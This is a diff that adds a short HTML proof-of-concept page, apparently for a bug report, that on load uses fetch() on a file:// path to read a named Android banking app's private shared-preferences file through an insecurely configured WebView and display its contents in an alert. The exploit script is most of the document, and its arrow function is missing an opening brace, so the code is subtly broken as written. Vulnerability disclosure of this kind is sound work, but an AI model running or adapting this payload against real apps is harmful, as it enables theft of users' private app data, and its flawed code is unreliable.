@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Insecure WebView Settings PoC</title>
+    <script type="text/javascript">
+        function exploit() {
+            fetch('file:///data/data/ca.koho/shared_prefs/com.appboy.device.xml')
+                .then(response => response.text())
+                .then(data => 
+                    alert("Sensitive file content: " + data);
+                })
+                .catch(err => {
+                    alert("Exploit failed: " + err.message);
+                });
+        }
+    </script>
+</head>
+<body onload="exploit()">
+    <h1>Insecure WebView Settings PoC</h1>
+    <p>Check if the content of a local file is displayed in an alert box.</p>
+</body>
+</html>
